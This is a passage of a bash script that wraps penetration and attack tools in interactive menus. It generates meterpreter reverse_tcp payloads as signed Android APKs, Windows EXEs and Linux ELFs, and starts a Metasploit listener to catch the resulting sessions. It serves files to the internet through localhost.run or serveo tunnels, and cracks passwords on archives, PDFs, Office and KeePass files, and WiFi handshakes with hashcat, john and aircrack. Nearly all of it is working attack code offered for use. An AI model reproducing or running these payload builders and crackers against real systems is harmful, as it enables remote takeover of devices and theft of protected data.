    sudo msfconsole -q -x "sessions -l; exit"
    read -p "Press [Enter] to continue..."
}

exploition () {
    while true; do
        info "-----Make Choice-----"
        info "1) List Sessions"
        info "2) Session Interact"
        info "3) Kill Session"
        info "0) Back"
        info "00) Main Menu"

        read -rp "$(info ">>")" choice

        case $choice in
            1) list_sessions ;;
            2) interact_session ;;
            3) kill_session ;;
            0) break ;;
            00) break 2 ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
               continue ;;
        esac
    done
}

create_apk () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME

    msfvenom -p android/meterpreter/reverse_tcp \
        LHOST=$LHOST LPORT=$LPORT \
        -o /tmp/$FNAME.apk

    info "Signing APK..."
    rm -f /tmp/test.keystore 2>/dev/null

    keytool -genkey -v -keystore /tmp/test.keystore \
        -alias testkey -keyalg RSA \
        -keysize 2048 -validity 365 \
        -dname "CN=Test, OU=Test, O=Test, L=Test, S=Test, C=US" \
        -storepass android123 -keypass android123 2>/dev/null

    apksigner sign --ks /tmp/test.keystore \
        --ks-pass pass:android123 \
        --key-pass pass:android123 \
        --out /tmp/$FNAME-signed.apk \
        /tmp/$FNAME.apk

    info "Signed APK saved to /tmp/$FNAME-signed.apk"
    read -p "Press [Enter] to continue..."
}

create_exe () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME
    msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST=$LHOST LPORT=$LPORT \
        -f exe -o /tmp/$FNAME.exe
    info "EXE saved to /tmp/$FNAME.exe"
    read -p "Press [Enter] to continue..."
}

create_elf () {
    read -rp "$(info "Your IP (LHOST): ")" LHOST
    read -rp "$(info "Port (LPORT): ")" LPORT
    read -rp "$(info "Output filename: ")" FNAME
    msfvenom -p linux/x86/meterpreter/reverse_tcp \
        LHOST=$LHOST LPORT=$LPORT \
        -f elf -o /tmp/$FNAME.elf
    info "ELF saved to /tmp/$FNAME.elf"
    read -p "Press [Enter] to continue..."
}

listner () {
    read -rp "$(info "LHOST: ")" LHOST
    read -rp "$(info "LPORT: ")" LPORT
    sudo fuser -k ${LPORT}/tcp 2>/dev/null

    sudo msfconsole -q -x "
        use exploit/multi/handler;
        set payload android/meterpreter/reverse_tcp;
        set LHOST $LHOST;
        set LPORT $LPORT;
        run"
}

payload () {
    while true; do
        info "-----Make Choice-----"
        info "1) Android APK"
        info "2) Windows EXE"
        info "3) Linux ELF"
        info "4) Start Listener"
        info "0) Back"
        info "00) Main Menu"

        read -rp "$(info ">>")" choice

        case $choice in
            1) create_apk ;;
            2) create_exe ;;
            3) create_elf ;;
            4) listner ;;
            0) break ;;
            00) break 2 ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
               continue ;;
        esac
    done
}

server () {
    local venv="/home/$(logname)/.venv"

    if [[ ! -x "$venv/bin/python3" ]]; then
        info "Setting up environment..."
        python3 -m venv "$venv"
        "$venv/bin/pip" install uploadserver -q
    fi

    read -rp "$(info "Full path to share (e.g. /tmp): ")" share

    if [[ ! -d "$share" ]]; then
        err "Folder not found"
        read -p "Press [Enter] to continue..."
        return 1
    fi

    cd "$share" || { err "Could not cd into $share"; return 1; }

    sudo fuser -k 8080/tcp 2>/dev/null

    info "Starting local server on port 8080..."
    "$venv/bin/python3" -m uploadserver 8080 &
    server_pid=$!

    trap 'kill $server_pid 2>/dev/null' EXIT

    sleep 2

    info "Creating tunnel - YOUR URL WILL APPEAR BELOW:"
    echo ""

    if ! ssh -T -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 \
        -R 80:localhost:8080 localhost.run; then
        err "localhost.run failed, retrying with serveo.net..."
        ssh -T -o StrictHostKeyChecking=accept-new -o ConnectTimeout=10 \
            -R 80:localhost:8080 serveo.net
    fi

    kill $server_pid 2>/dev/null
    trap - EXIT
    cd - > /dev/null
}

# ══════════════════════════════════════════════════════════════════════════════
# META MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

meta_menu () {
    clear
    while true; do
        info "-----Make Choice-----"
        info "1) Start/Connect Database"
        info "2) Open a Server"
        info "3) Network Scan"
        info "4) Search Exploit"
        info "5) Active Sessions"
        info "6) Post Exploitation"
        info "7) Create Payloads"
        info "0) Back"

        read -rp "$(info ">>")" choice

        case $choice in
            1) start ;;
            2) server ;;
            3) scanning ;;
            4) exploit ;;
            5) sessions ;;
            6) exploition
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            7) payload
               [[ $GOTO_MAIN -eq 1 ]] && { GOTO_MAIN=0; break; } ;;
            0) break ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
               continue ;;
        esac
    done
}


# ══════════════════════════════════════════════════════════════════════════════
# 		HASHCAT Logic
# ══════════════════════════════════════════════════════════════════════════════

crack () {
	
		warn "Removing any previous caches"
		read -rp "$(printf "${RED}${BOLD} Press [ENTER] to continue${NC}")"
	    rm -f "/home/$(logname)/hash.txt"
		rm -f "/home/$(logname)/.john/john.pot"
		rm -f "$HASHFILE"
		rm -f "$HCFILE"
		info "SUPPORTED FILE::: ZIP, RAR, PDF, 7Z, CAP, OFFICE (doc/docx/xls/xlsx/ppt/pptx), KDBX (keepass)"
		file_selection || return 1
		file_extension || return 1


}

generate () {
		
		info "Creating a permanent wordlist inside /home/$(logname)/filename.txt"
		read -rp "$(printf "${ORANGE} Min Character ${NC}\t")" min
		read -rp "$(printf "${ORANGE} Max Character ${NC}\t")" max
		read -rp "$(printf "${ORANGE} Character ${NC}\t")" char
		read -rp "$(printf "${ORANGE} File Name Without Extension >> ${NC}\t")" fill
		read -p "press [ENTER] to continue"
		
		crunch $min $max $char -o $fill.txt
		
		info "File Generated"
		read -p "press [ENTER] to continue"
	
	}

delete () {
	
	warn "This will remove all temp files AND stored cracked passwords (potfiles)."
	read -rp "$(printf "${RED}Continue? (y/n): ${NC}")" confirm
	
	if [[ $confirm != y ]]; then
		info "Cancelled"
		read -p "Press [Enter] to continue"
		return 0
	fi
	
	rm -f "$HASHFILE"
	rm -f "$HCFILE"
	rm -f /tmp/crunch_tmp_*.txt
	rm -f "/home/$(logname)/.john/john.pot"
	rm -f "/home/$(logname)/.local/share/hashcat/hashcat.potfile"
	rm -f "/home/$(logname)/.hashcat/hashcat.potfile"
	rm -f ./*.restore
	rm -f "/home/$(logname)/handshake.hc22000"
	
	info "All temporary files and potfiles cleared"
	read -p "Press [Enter] to continue"
	return 0
}

file_selection () {
	
	while true; do
	info "File Should Be In Script Home Directory"
	read -rp "$(printf "${YELLOW}Choose a file: ${NC}")" file

    if [[ -f $file ]]; then
        info "File Valid"
        read -p "Press [Enter] key to continue..."
        return 0 # if not applied ask again and again fo file name
    else
        err "Wrong File/Wrong Name try again"
		read -p "Press [Enter] key to continue..."
    fi
	done
}

file_extension () {
	
	info "Choose the file Extension...."
	
	while true; do
		prin "1)ZIP"
		prin "2)RAR"
		prin "3)PDF"
		prin "4)7Z"
		prin "5)CAP"
		prin "6)KEEPASS"
		prin "7)OFFICE"
		prin "0)Select File Again"		
	
	read -p ">>" extvaibhav
	
	case $extvaibhav in 
		1) zip_run; return 0;;
		2) rar_run; return 0;;
		3) pdf_run; return 0;;
		4) sevenzip_run; return 0;;
		5) cap_run; return 0;;
		6) keepass_run; return 0;;
		7) office_run; return 0;;
		0) return 0 ;;
		*) err "Choose Correct Number (1-7)"
			read -p "Press [Enter] to continue"
			continue	;;
	esac
	done
}


extract_hash () {
	local tool=$1
	"$tool" "$file" > "$HASHFILE"
	grep -oP '\$\w+\$.*?\$/\w+\$' "$HASHFILE" > "$HCFILE"
}


zip_run () {
	
	info "Extracting HASH From $file"
	extract_hash zip2john  #zip2john — reads the ZIP file's encryption header ;;;myfile.zip — your target file ;;; > hash.txt — saves the extracted hash to a file
	
	    # Guard against empty hash
    if [ ! -s "$HASHFILE" ]; then
        err "Empty hash file provided"
        return 1
    fi
    
    ext=13600
    
    read -p "press [ENTER] to continue"
    return 0
}
rar_run () {
		
		info "Extracting HASH From $file"
		extract_hash rar2john
		
		# Guard against empty hash
		if [ ! -s "$HASHFILE" ]; then
			err "Empty hash file provided"
			return 1
		fi
		
		ext=13000
		
		read -p "press [ENTER] to continue"
		return 0
}
	
pdf_run () {
		
		info "Extracting HASH From $file"
		extract_hash pdf2john
		
		    # Guard against empty hash
		if [ ! -s "$HASHFILE" ]; then
			err "Empty hash file provided"
			return 1
		fi
		
		ext=10500
		
		read -p "press [ENTER] to continue"
		return 0
}
sevenzip_run () { #Note: function name 7zip_run starting with a digit is invalid in bash — function names can't start with a number.
		
		info "Extracting HASH From $file"
		extract_hash 7z2john
		
		    # Guard against empty hash
    if [ ! -s "$HASHFILE" ]; then
        err "Empty hash file provided"
        return 1
    fi
    
    ext=11600
    
    read -p "press [ENTER] to continue"
    return 0
}
cap_run () {
		
		info "Extracting HASH From $file"
		hcxpcapngtool -o "$HCFILE" "$file"
		
		ext=22000
		
		read -p "press [ENTER] to continue"
		return 0
}
keepass_run () {
		
		info "Extracting HASH From $file"
		extract_hash keepass2john
	
		    # Guard against empty hash
    if [ ! -s "$HASHFILE" ]; then
        err "Empty hash file provided"
        return 1
    fi
    
    ext=13400
    
    read -p "press [ENTER] to continue"
    return 0
}
office_run () {
		
		info "Extracting HASH From $file"
		extract_hash office2john
		
		    # Guard against empty hash
    if [ ! -s "$HASHFILE" ]; then
        err "Empty hash file provided"
        return 1
    fi
    
    ext=9600
    
    read -p "press [ENTER] to continue"
    return 0
}

get_wordlist () {
	
	into "1) Use Existing Wordlist"
	into "2) Generate Temporary Wordlist (crunch)"
	
	read -rp ">> " wl_choice
	
	case $wl_choice in
		1)
			read -rp "$(printf "${DIM}Wordlist Name Whitout Extension${NC}\t")" wl_name
			if [ -z "$wl_name" ]; then
				err "Choose the Wordlist"
				return 1
			fi
			WORDLIST_PATH="/home/$(logname)/$wl_name".txt
			;;
		2)
			read -rp "$(printf "${ORANGE}Min Character${NC}\t")" min
			read -rp "$(printf "${ORANGE}Max Character${NC}\t")" max
			read -rp "$(printf "${ORANGE}Charset${NC}\t")" char
			
			WORDLIST_PATH="/tmp/crunch_tmp_$$.txt"
			
			info "Generating temporary wordlist..."
			crunch "$min" "$max" "$char" -o "$WORDLIST_PATH"
			;;
		*)
			err "Wrong Choice"
			return 1
			;;
	esac
	
	if [ ! -s "$WORDLIST_PATH" ]; then
		err "Wordlist is empty or missing"
		return 1
	fi
	
	return 0
}

validate_digit () {
	local value=$1
	if [[ ! $value =~ ^[0-9]+$ ]]; then
		err "Enter a valid number"
		return 1
	fi
	return 0
}

mask_menu () {
	
	while true; do
	into "1) Digits Only"
	into "2) Lowercase Only"
	into "3) Uppercase Only"
	into "4) Merge (Upper+Lower+Digit)"
	pp "0) Back"
	
	read -rp ">> " mask_choice
	
	case $mask_choice in
		1)
			read -p "How Many Digits >> " digits
			validate_digit "$digits" || return 1
			MASK=""                              # start with an empty string, we'll build it up
			for ((i=0; i<digits; i++)); do       # loop runs exactly $digits times (i goes 0,1,2...digits-1)
				MASK+="?d"                        # each loop, append one "?d" placeholder to MASK
			done      
			break                            # after loop ends, MASK = "?d" repeated $digits times
			;;
		2)
			read -p "How Many Letters >> " letters
			validate_digit "$letters" || return 1
			MASK=""
			for ((i=0; i<letters; i++)); do
				MASK+="?l"
			done
			break
			;;
		3)
			read -p "How Many Letters >> " letters
			validate_digit "$letters" || return 1
			MASK=""
			for ((i=0; i<letters; i++)); do
				MASK+="?u"
			done
			break
			;;
		4)
			read -rp "Enter order (e.g. uld, dul, ldu, dlu, udl, lud): " order
			
			case $order in
				uld)
					MASK=""
					
					read -p "How Many Uppercase >> " upper
					validate_digit "$upper" || return 1
					for ((i=0; i<upper; i++)); do
						MASK+="?u"
					done
					
					read -p "How Many Lower Case >> " letters
					validate_digit "$letters" || return 1
					for ((i=0; i<letters; i++)); do
						MASK+="?l"
					done
					
					read -p "How Many Digits >> " digits
					validate_digit "$digits" || return 1
					for ((i=0; i<digits; i++)); do
						MASK+="?d"
					done
					 
					 break
					;;
					
				ldu)
					MASK=""
					
					read -p "How Many Lower Case >> " letters
					validate_digit "$letters" || return 1
					for ((i=0; i<letters; i++)); do
						MASK+="?l"
					done
					
					read -p "How Many Digits >> " digits
					validate_digit "$digits" || return 1
					for ((i=0; i<digits; i++)); do
						MASK+="?d"
					done
					 
					read -p "How Many Uppercase >> " upper
					validate_digit "$upper" || return 1
					for ((i=0; i<upper; i++)); do
						MASK+="?u"
					done
					break
					;;
					
				dul)
					MASK=""
					
					read -p "How Many Digits >> " digits
					validate_digit "$digits" || return 1
					for ((i=0; i<digits; i++)); do
						MASK+="?d"
					done
					
					read -p "How Many Uppercase >> " upper
					validate_digit "$upper" || return 1
					for ((i=0; i<upper; i++)); do
						MASK+="?u"
					done 
					
					read -p "How Many Lower Case >> " letters
					validate_digit "$letters" || return 1
					for ((i=0; i<letters; i++)); do
						MASK+="?l"
					done
					break
					;;
					
				dlu) 
					MASK=""
					
					read -p "How Many Digits >> " digits
					validate_digit "$digits" || return 1
					for ((i=0; i<digits; i++)); do
						MASK+="?d"
					done
					 
					read -p "How Many Lower Case >> " letters
					validate_digit "$letters" || return 1
					for ((i=0; i<letters; i++)); do
						MASK+="?l"
					done
					
					read -p "How Many Uppercase >> " upper
					validate_digit "$upper" || return 1
					for ((i=0; i<upper; i++)); do
						MASK+="?u"
					done
					break
					;;
				
				udl) 
					MASK=""
					
					read -p "How Many Uppercase >> " upper
					validate_digit "$upper" || return 1
					for ((i=0; i<upper; i++)); do
						MASK+="?u"
					done
					
					read -p "How Many Digits >> " digits
					validate_digit "$digits" || return 1
					for ((i=0; i<digits; i++)); do
						MASK+="?d"
					done
					 
					read -p "How Many Lower Case >> " letters
					validate_digit "$letters" || return 1
					for ((i=0; i<letters; i++)); do
						MASK+="?l"
					done
					break
					;;
				
				lud) 
					MASK=""

					read -p "How Many Lower Case >> " letters
					validate_digit "$letters" || return 1
					for ((i=0; i<letters; i++)); do
						MASK+="?l"
					done
					
					read -p "How Many Uppercase >> " upper
					validate_digit "$upper" || return 1
					for ((i=0; i<upper; i++)); do
						MASK+="?u"
					done
					
					read -p "How Many Digits >> " digits
					validate_digit "$digits" || return 1
					for ((i=0; i<digits; i++)); do
						MASK+="?d"
					done
					break
					;;
					
				*)
					err "Invalid order"
					return 1
					;;
			esac
			;;
			
		0) break 2 ;;
		*)
			err "Wrong Choice"
			return 1
			;;
	esac
	
	# MASK should be fully built and ready here
	# to be used by hashcat_run (-a 3 "$MASK") and john_run (--mask="$MASK")
	
	done
}

hashcat_run () {
	
	read -p "Method of cracking (MASK--y / Wordlist--n) >> " way
	
	if [[ $way = y ]]; then
		mask_menu
		hashcat -d 1 -D 1 -a 3 -m "$ext" "$HCFILE" "$MASK" -w 3 -O --force
		hashcat -m "$ext" "$HCFILE" --show
	
	else
	
	get_wordlist || return 1
	read -p "Press [Enter] to begin cracking"
	hashcat -d 1 -D 1 -a 0 -m "$ext" "$HCFILE" "$WORDLIST_PATH" -w 3 -O --force
	hashcat -m "$ext" "$HCFILE" --show
	
	fi
	read -p "Press [Enter] to Continue"
	
}

john_run () {
	
	if [[ ! $file =~ \.(zip|rar|pdf|7z|doc|docx|xls|ppt|pptx|kdbx)$ ]]; then
		err "Invalid file — expected a different file format"	
		read -p "Press [Enter] to Continue"
		return 1
	fi
	
	if [ -z "$ext" ]; then
		err "No format selected"
		return 1
	fi
	
	read -p "Method of cracking (MASK--y / Wordlist--n) >> " way
	
	if [[ $way = y ]]; then
	mask_menu
	john --mask="$MASK" "$HASHFILE"
	
	else
	get_wordlist || return 1
	john --wordlist="$WORDLIST_PATH" "$HASHFILE"
	fi
	
	read -p "Press [Enter] to Continue"
}

aircrack_run () {
	
		if [[ ! $file =~ \.(cap|pcap|pcapng)$ ]]; then
			err "Invalid extension — expected .cap/.pcap/.pcapng"
			read -p "Press [Enter] to Continue"
			return 1
		fi
		get_wordlist || return 1
	
	
		read -rp "$(warn "Enter AP of Handshake")" ap
		
	aircrack-ng -w "$WORDLIST_PATH" -b "$ap" "$file"	
	
	read -p "Press [ENTER] to Continue"
}	

way_crack () {
	
	while true; do
	
	into "1) By Hashcat"
	into "2) By John"
	into "3) By Aircrack"
	pp "0) Back"
	
	read -p ">>  " choice
	
	case $choice in 
	
	1) hashcat_run;;
	2) john_run;;
	3)aircrack_run;;
	0) return 1;;
	*) warn "Wrong Choice"; return 1;;
	esac
	
	done
}
# ══════════════════════════════════════════════════════════════════════════════
# 		HASHCAT MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

crack_menu () {
    while true; do
    
		clear
		print_banners
		
        printf "${MAGENTA}1.Select File To Crack${NC}\n"
        printf "${MAGENTA}2.Generate a Wordlist${NC}\n"
        printf "${MAGENTA}3.Clear Temporary File${NC}\n"
        printf "${RED}0.Main Menu${NC}\n"

        read -rp "$(printf "${GREEN}Make Choice => ${NC}")" reading

        case $reading in 
            1)crack && way_crack;;  #useed && means if crack is runned successfully only then run way_crack
            2)generate;;
            3)delete;;
            0) return 0 ;;
            *) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"

        esac 
    done
}
# ══════════════════════════════════════════════════════════════════════════════
# MAIN MENU Logic
# ══════════════════════════════════════════════════════════════════════════════

run

while true; do
		    clear
			prin_banner
			workflow
    
		
		into "1) WIFI Audit Script"
		into "2) BETTERCAP Script"
		into "3) NMAP Script"
		into "4) METASPLOIT Script"
		into "5) HASHCAT Script"
		out "0) EXIT"
		
		read -rp "$(printf "${BOLD}${DIM}${GREEN}Choose any option ==>${NC}\t")" choice
		
		case $choice in 
			
			1) select_interface
				wifi_menu;;
			
			2)bettercap_menu;;
			
			3)nmap_menu;;
			
			4)meta_menu;;
			
			5)crack_menu;;
			
			0) to "Have a Nice Day"
				break;;
				
			*) read -rp "$(printf "${RED}Choose correct option [ENTER]${NC}")"
				continue ;;
		esac

 done

